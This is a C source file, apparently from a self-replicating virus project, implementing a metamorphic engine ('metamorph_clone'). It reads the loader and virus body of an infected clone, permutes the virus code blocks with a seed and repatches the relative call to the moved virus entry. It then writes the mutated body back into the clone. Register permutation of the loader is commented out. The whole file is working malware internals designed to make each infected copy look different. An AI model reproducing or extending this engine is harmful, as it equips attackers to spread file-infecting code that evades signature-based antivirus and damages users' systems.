
#include <sys/mman.h>

#include "syscall.h"
#include "virus.h"
#include "metamorphism.h"
#include "utils.h"
#include "errors.h"

/*
** metamorph_clone is a metamorphic generator for the virus and loader.
**   It applies register permutations on the clone's loader code
**   And block permutations on the clone's virus code
**
**   Some parts of the loader can't be reg-permutated because of
**   syscall calling conventions.
*/

/* ---------------------------------- init ---------------------------------- */

static bool	init_loader_safe(struct safe_ptr *loader_ref, \
			struct safe_ptr clone_ref, size_t loader_off, size_t loader_size)
{
	void	*clone_loader = safe(clone_ref, loader_off, loader_size);

	if (!clone_loader) return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER);

	loader_ref->ptr = clone_loader;
	loader_ref->size = loader_size;

	return true;
}

static bool	init_virus_safe(struct safe_ptr *virus_ref,           \
			struct safe_ptr clone_ref, size_t loader_off, \
			size_t dist_virus_loader, size_t full_virus_size)
{
	size_t	virus_off = loader_off + dist_virus_loader;

	size_t	virus_size = full_virus_size - dist_virus_loader;
	void	*clone_virus = safe(clone_ref, virus_off, virus_size);

	if (!clone_virus) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRUS);

	virus_ref->ptr = clone_virus;
	virus_ref->size = virus_size;

	return true;
}

static bool	init_virus_buffer_safe(struct safe_ptr *virus_buffer_ref, \
			size_t loader_off,                                \
			size_t dist_virus_loader, size_t clone_size)
{
	size_t	virus_off = loader_off + dist_virus_loader;

	size_t	available_size = clone_size - virus_off;
	void	*ptr = sys_mmap(0, available_size, PROT_READ | PROT_WRITE,
			MAP_ANON | MAP_PRIVATE, -1, 0);

	if (ptr < 0) return errors(ERR_SYS, _ERR_S_MMAP_FAILED);

	virus_buffer_ref->ptr = ptr;
	virus_buffer_ref->size = available_size;

	return true;
}

static bool	get_clone_virus_address(void **clone_virus_address,
			struct safe_ptr clone_ref, size_t loader_off, size_t dist_vircall_loader)
{
	size_t	vircall_off = loader_off + dist_vircall_loader;
	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);

	if (!clone_vircall) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRCALL);

	int32_t	*clone_vircall_arg = clone_vircall + 1;
	void	*clone_vircall_end = clone_vircall + CALL32_INST_SIZE;

	*clone_virus_address = (void*)((ssize_t)clone_vircall_end + *clone_vircall_arg);

	return true;
}

static inline bool	set_virus_buffer_size(size_t *virus_buffer_size, \
				size_t virus_size)
{
	*virus_buffer_size = virus_size;
	return true;
}

static bool	set_clone_virus_call(struct safe_ptr clone_ref, \
			size_t loader_off, size_t dist_vircall_loader, \
			int32_t clone_virus_address_shift)
{
	size_t	vircall_off = loader_off + dist_vircall_loader;
	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);

	if (!clone_vircall) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRCALL);

	int32_t	*clone_vircall_arg = clone_vircall + 1;

	*clone_vircall_arg += clone_virus_address_shift;

	return true;
}

static bool	copy_virus_buffer_to_clone(struct safe_ptr clone_ref, \
			size_t loader_off, size_t dist_virus_loader,  \
			struct safe_ptr virus_buffer_ref, size_t virus_buffer_size)
{
	size_t	virus_off = loader_off + dist_virus_loader;

	void	*clone_virus = safe(clone_ref, virus_off, virus_buffer_size);

	if (!clone_virus) return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRUS);

	memcpy(clone_virus, virus_buffer_ref.ptr, virus_buffer_size);

	return true;
}

static bool	set_full_virus_size(size_t *full_virus_size, \
			size_t virus_buffer_size, size_t virus_size)
{
	*full_virus_size += virus_buffer_size - virus_size;
	return true;
}

/* ---------------------------- metamorph_clone ----------------------------- */

bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, \
			uint64_t seed, size_t *full_virus_size,               \
			const struct virus_header *vhdr)
{
	struct safe_ptr	loader_ref;
	struct safe_ptr	virus_ref;
	struct safe_ptr	virus_buffer_ref;
	size_t		virus_buffer_size;
	void		*clone_virus_address;
	int32_t		clone_virus_address_shift = 0;
	size_t		loader_size         = vhdr->loader_size;
	size_t		dist_virus_loader   = vhdr->dist_virus_loader;
	size_t		dist_vircall_loader = vhdr->dist_vircall_loader;

	if (!init_loader_safe(&loader_ref, clone_ref, loader_off, loader_size)
	|| !init_virus_safe(&virus_ref, clone_ref, loader_off, dist_virus_loader, *full_virus_size)
	|| !init_virus_buffer_safe(&virus_buffer_ref, loader_off, dist_virus_loader, clone_ref.size)
	|| !get_clone_virus_address(&clone_virus_address, clone_ref, loader_off, dist_vircall_loader)
	|| !set_virus_buffer_size(&virus_buffer_size, virus_ref.size)
	// || !permutate_registers(loader_ref, seed)
	|| !permutate_blocks(virus_ref, virus_buffer_ref, &virus_buffer_size, clone_virus_address, &clone_virus_address_shift, seed)
	|| !set_clone_virus_call(clone_ref, loader_off, dist_vircall_loader, clone_virus_address_shift)
	|| !copy_virus_buffer_to_clone(clone_ref, loader_off, dist_virus_loader, virus_buffer_ref, virus_buffer_size)
	|| !set_full_virus_size(full_virus_size, virus_buffer_size, virus_ref.size)
	|| !true)
	{
		free_accessor(&virus_buffer_ref);
		return errors(ERR_THROW, _ERR_T_METAMORPH_CLONE);
	}
	free_accessor(&virus_buffer_ref);

	return true;
}
